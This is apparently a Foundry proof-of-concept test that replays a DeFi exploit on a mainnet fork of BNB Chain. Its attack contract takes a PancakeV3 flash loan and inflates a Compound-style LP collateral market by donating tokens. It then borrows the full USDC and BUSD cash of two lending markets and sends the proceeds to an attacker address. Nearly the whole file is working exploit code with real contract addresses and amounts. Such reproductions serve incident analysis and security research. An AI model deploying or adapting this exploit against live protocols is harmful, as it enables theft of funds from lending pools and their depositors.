
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 34847595;
    uint256 constant TX_TIMESTAMP = 1704063791;
    uint256 constant TX_BLOCK_NUMBER = 34847596;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AttackContract attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AttackContract attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = AttackContract(payable(ATTACK_CONTRACT));
        } else {
            attack = new AttackContract();
        }
    }

    function _prepareProfit(AttackContract attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(AttackContract).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 3128837445560031450147);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.BUSD, "BUSD", 1283970316009743676673);
    }
}

contract AttackContract {
    function attack() external payable {
        startFlashLoan();
    }

    function flashCallback() internal {
        callbackEntered = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
    }

    function flashCallback2() internal view {
        IERC20Like(Addresses.BUSD).balanceOf(address(this));
    }

    function flashCallback3() internal {
        uint256 busdToPair = 42218672818223010583114;
        IERC20Like(Addresses.BUSD).transfer(Addresses.Cake_LP_4F33, busdToPair);
        uint256 attackBtcbBalance = IERC20Like(Addresses.BTCB).balanceOf(address(this));
        IERC20Like(Addresses.BTCB).transfer(Addresses.Cake_LP_4F33, attackBtcbBalance);
    }

    function flashCallback4() internal {
        IPancakePair(Addresses.Cake_LP_4F33).mint(address(this));
        IERC20Like(Addresses.Cake_LP_4F33).balanceOf(address(this));
        uint256 attackPairBalance = IERC20Like(Addresses.Cake_LP_4F33).balanceOf(address(this));
        IERC20Like(Addresses.Cake_LP_4F33).transfer(Addresses.cCLP_BTCB_BUSD, attackPairBalance);
    }

    function flashCallback5() internal {
        uint256 attackCakeBalance = IERC20Like(Addresses.Cake).balanceOf(address(this));
        IERC20Like(Addresses.Cake).transfer(Addresses.cCLP_BTCB_BUSD, attackCakeBalance);
        IcCLP_BTCB_BUSD(Addresses.cCLP_BTCB_BUSD).accrueInterest();
    }

    function flashCallback6() internal {
        IComptrollerLike(Addresses.A_FC5183_FC8C).enterMarkets(_oneMarket(Addresses.cCLP_BTCB_BUSD));
    }

    function flashCallback7() internal {
        IComptrollerLike(Addresses.A_FC5183_FC8C)
            .enterMarkets(_twoMarkets(Addresses.cUSDC, Addresses.cBUSD));
    }

    function flashCallback8() internal {
        IcUSDC(Addresses.cUSDC).underlying();
        uint256 cUsdcCash = IERC20Like(Addresses.USDC).balanceOf(Addresses.cUSDC);
        IcUSDC(Addresses.cUSDC).borrow(cUsdcCash);
    }

    function flashCallback9() internal {
        IcBUSD(Addresses.cBUSD).underlying();
        uint256 cBusdCash = IERC20Like(Addresses.BUSD).balanceOf(Addresses.cBUSD);
        IcBUSD(Addresses.cBUSD).borrow(cBusdCash);
    }

    function flashCallback10() internal {
        IcCLP_BTCB_BUSD(Addresses.cCLP_BTCB_BUSD).redeemUnderlying(174494827409609936689);
        IERC20Like(Addresses.Cake_LP_4F33).balanceOf(address(this));
    }

    function flashCallback11() internal {
        uint256 pairRedeemAmount = 174494827409609936689;
        IERC20Like(Addresses.Cake_LP_4F33).transfer(Addresses.Cake_LP_4F33, pairRedeemAmount);
        IPancakePair(Addresses.Cake_LP_4F33).burn(address(this));
        IERC20Like(Addresses.BTCB).balanceOf(address(this));
    }

    function flashCallback12() internal {
        ISwapRouter(Addresses.SwapRouter)
            .exactOutput(
                ExactOutputParams({
                    path: abi.encodePacked(
                        Addresses.BTCB, uint24(500), Addresses.WBNB, uint24(500), Addresses.USDC
                    ),
                    recipient: address(this),
                    deadline: 1704063791,
                    amountOut: 503715695155049,
                    amountInMaximum: type(uint256).max
                })
            );
    }

    function flashCallback13() internal {
        uint256 btcbRepayment = 1000500000000000000;
        IERC20Like(Addresses.BTCB).transfer(Addresses.PancakeV3Pool, btcbRepayment);
        uint256 busdRepayment = 42239782154632122088406;
        IERC20Like(Addresses.BUSD).transfer(Addresses.PancakeV3Pool, busdRepayment);
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function flashCallback14() internal view {
        IERC20Like(Addresses.BUSD).balanceOf(address(this));
    }

    function flashCallback15() internal {
        uint256 attackBusdBalance = IERC20Like(Addresses.BUSD).balanceOf(address(this));
        IERC20Like(Addresses.BUSD).transfer(Addresses.attacker_eoa, attackBusdBalance);
        uint256 attackUsdcBalance = IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, attackUsdcBalance);
    }

    function startFlashLoan() internal {
        syncPairReserves();
        borrowFromPool();
    }

    function syncPairReserves() internal view {
        IPancakePair(Addresses.Cake_LP_4F33).getReserves();
    }

    function borrowFromPool() internal {
        bytes memory callbackData =
            abi.encode(0x0000000000000000000000000de0b6B3a7640000, 0x0000000000000000000008F0ADC86C0EfE5c924a);
        IPancakeV3Pool(Addresses.PancakeV3Pool)
            .flash(address(this), 1000000000000000000, 42218672818223010583114, callbackData);
    }

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata callbackData) external payable {
        fee0;
        fee1;
        callbackData;
        if (!callbackEntered) flashCallback();
        return;
    }

    function go(uint256 amount) external payable {
        amount;
        startFlashLoan();
        return;
    }

    bool private callbackEntered;

    function _oneMarket(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _twoMarkets(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_6F67 = 0x000000000000000000636F6e736F6c652e6c6f67;
    address internal constant Cake = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant SwapRouter = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;
    address internal constant A_1C4C34_AB67 = 0x1c4c34A84aE6f2fEB93C98d3619287b8738Fab67;
    address internal constant A_2ED336_0257 = 0x2Ed336E72f4DaC06f472EBafCb7823645cEf0257;
    address internal constant cUSDC = 0x33e68c922d19D74ce845546a5c12A66ea31385c4;
    address internal constant PancakeV3Pool = 0x369482C78baD380a036cAB827fE677C1903d1523;
    address internal constant PancakeV3Pool_D636 = 0x6bbc40579ad1BBD243895cA0ACB086BB6300d636;
    address internal constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address internal constant MasterChef = 0x73feaa1eE314F8c655E354234017bE2193C9E24E;
    address internal constant Cake_LP = 0x804678fa97d91B974ec2af3c843270886528a9E6;
    address internal constant PancakeV3Pool_1824 = 0x81A9b5F18179cE2bf8f001b8a634Db80771F1824;
    address internal constant A_86EABA_C628 = 0x86EABa7cBC66fCCf36cCB5b7B500f2c6c5Edc628;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant cCLP_BTCB_BUSD = 0x93790C641D029D1cBd779D87b88f67704B6A8F4C;
    address internal constant attack_contract = 0xA47b9f87173edA364c821234158dDA47B03AC217;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_BEBA90_1C8F = 0xBEBA905188a00b8C2FA2789E2550A3A3144b1C8f;
    address internal constant cBUSD = 0xca797539f004C0F9c206678338f820AC38466D4b;
    address internal constant GnosisSafeProxy = 0xcEba60280fb0ecd9A5A26A1552B90944770a4a0e;
    address internal constant attacker_eoa = 0xD227dC77561b58C5a2d2644Ac0173152A1a5Dc3D;
    address internal constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address internal constant Cake_LP_4F33 = 0xF45cd219aEF8618A92BAa7aD848364a158a24F33;
    address internal constant A_FC5183_FC8C = 0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct ExactOutputParams {
    bytes path;
    address recipient;
    uint256 deadline;
    uint256 amountOut;
    uint256 amountInMaximum;
}

interface IPancakePair {
    function burn(address) external;
    function getReserves() external view;
    function mint(address) external returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata) external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface ISwapRouter {
    function exactOutput(ExactOutputParams calldata) external returns (uint256);
}

interface IcBUSD {
    function borrow(uint256) external returns (uint256);
    function underlying() external view returns (uint256);
}

interface IcCLP_BTCB_BUSD {
    function accrueInterest() external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
}

interface IcUSDC {
    function borrow(uint256) external returns (uint256);
    function underlying() external view returns (uint256);
}
